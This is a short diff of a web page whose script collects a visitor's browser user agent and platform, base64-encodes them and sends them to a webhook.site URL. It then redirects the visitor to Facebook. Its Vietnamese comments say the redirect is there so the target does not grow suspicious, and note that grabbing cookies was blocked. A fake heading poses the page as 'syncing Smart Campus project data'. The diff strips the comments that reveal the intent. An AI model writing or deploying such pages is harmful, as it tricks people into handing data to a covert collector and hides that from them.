@@ -2,12 +2,13 @@
   // Thay vì lấy toàn bộ cookie (bị chặn), ta lấy thông tin trình duyệt và IP để đánh lừa
   var info = "UserAgent: " + navigator.userAgent + " | Platform: " + navigator.platform;
   
-  // Gửi dữ liệu về Webhook
+
   fetch("https://webhook.site/63a27832-d5bc-440f-9993-e12efa944916?data=" + btoa(info));
 
-  // Tự động chuyển hướng về trang chủ FB để bạn kia không nghi ngờ
+ 
   setTimeout(function(){
     window.location.href = "https://www.facebook.com";
   }, 1000);
 </script>
 <h1>Đang đồng bộ dữ liệu dự án Smart Campus... vui lòng đợi</h1>
+
